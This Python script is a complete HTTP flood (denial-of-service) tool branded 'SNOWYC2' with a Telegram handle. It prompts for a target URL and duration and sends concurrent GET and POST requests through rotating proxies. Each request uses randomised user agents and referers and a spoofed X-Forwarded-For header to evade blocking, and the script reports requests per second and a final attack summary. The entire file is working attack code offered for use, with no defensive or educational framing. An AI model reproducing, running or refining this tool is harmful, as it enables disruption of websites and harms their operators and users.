import asyncio
import time
import random
import os
import aiohttp

def load_lines(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

REFERERS = load_lines("refs.txt")
USER_AGENTS = load_lines("uas.txt")
PROXIES = load_lines("STS.txt")

REQUEST_TIMEOUT = 10
PROXY_CONCURRENT = 10

class AttackEngine:
    def __init__(self, target, duration):
        self.target = target
        self.duration = duration
        self.start_time = time.time()
        self.stats = {
            'total': 0,
            'success': 0,
            'errors': 0,
            'rps': 0,
            'peak_rps': 0,
            'post_sent': 0
        }
        self.proxy_index = 0

    def update_stats(self, results):
        self.stats['total'] += len(results)
        self.stats['success'] += results.count("SUCCESS")
        self.stats['errors'] += results.count("ERROR")
        elapsed = time.time() - self.start_time
        rps = self.stats['total'] / elapsed if elapsed > 0 else 0
        self.stats['rps'] = rps
        self.stats['peak_rps'] = max(self.stats['peak_rps'], rps)

    def next_proxy(self):
        if not PROXIES:
            return None
        proxy = PROXIES[self.proxy_index % len(PROXIES)]
        self.proxy_index += 1
        return f"http://{proxy}"

    def headers(self):
        return {
            "User-Agent": random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0",
            "Referer": random.choice(REFERERS) if REFERERS else "https://google.com",
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }

    async def send(self, session):
        headers = self.headers()
        proxy = self.next_proxy()

        if self.stats['post_sent'] < 2000:
            method = random.choice(["GET", "POST"])
        else:
            method = "GET"

        try:
            if method == "POST":
                self.stats['post_sent'] += 1
                async with session.post(self.target, headers=headers, proxy=proxy, data="") as resp:
                    return "SUCCESS" if resp.status == 200 else "ERROR"
            else:
                async with session.get(self.target, headers=headers, proxy=proxy) as resp:
                    return "SUCCESS" if resp.status == 200 else "ERROR"
        except:
            return "ERROR"

    async def run_attack(self):
        connector = aiohttp.TCPConnector(ssl=False, limit=None)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            while time.time() - self.start_time < self.duration:
                tasks = [self.send(session) for _ in range(PROXY_CONCURRENT)]
                results = await asyncio.gather(*tasks)
                self.update_stats(results)
                self.print_status()
        self.print_summary()

    def print_status(self):
        os.system("cls" if os.name == "nt" else "clear")
        elapsed = time.time() - self.start_time
        remaining = max(0, self.duration - elapsed)
        print(f"\nSNOWYC2 - T.ME/STSVKINGDOM")
        print("=" * 60)
        print(f"METHOD: C-ECLIPSE | TARGET: {self.target} | TIME: {self.duration}s")
        print("=" * 60)
        print(f"TOTAL: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f"POSTS USED: {self.stats['post_sent']} / 2000")
        print(f"RPS: {self.stats['rps']:.1f} | PEAK: {self.stats['peak_rps']:.1f}")
        print(f"TIME LEFT: {remaining:.1f}s")
        print("=" * 60)

    def print_summary(self):
        elapsed = time.time() - self.start_time
        avg_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
        print("\nATTACK COMPLETED")
        print("=" * 60)
        print(f"TARGET: {self.target}")
        print(f"DURATION: {elapsed:.1f}s")
        print(f"TOTAL REQUESTS: {self.stats['total']}")
        print(f"SUCCESS: {self.stats['success']}")
        print(f"ERRORS: {self.stats['errors']}")
        print(f"POSTS SENT: {self.stats['post_sent']}")
        print(f"AVG RPS: {avg_rps:.1f}")
        print("=" * 60)

def main():
    print("\nSNOWYC2 - T.ME/STSVKINGDOM")
    print("=" * 60)
    target = input("TARGET: ").strip()
    if not target.startswith("http"):
        target = "http://" + target
    try:
        duration = int(input("TIME (seconds): ").strip())
    except:
        print("Invalid time.")
        return

    engine = AttackEngine(target, duration)
    try:
        asyncio.run(engine.run_attack())
    except KeyboardInterrupt:
        print("\nStopped by user.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
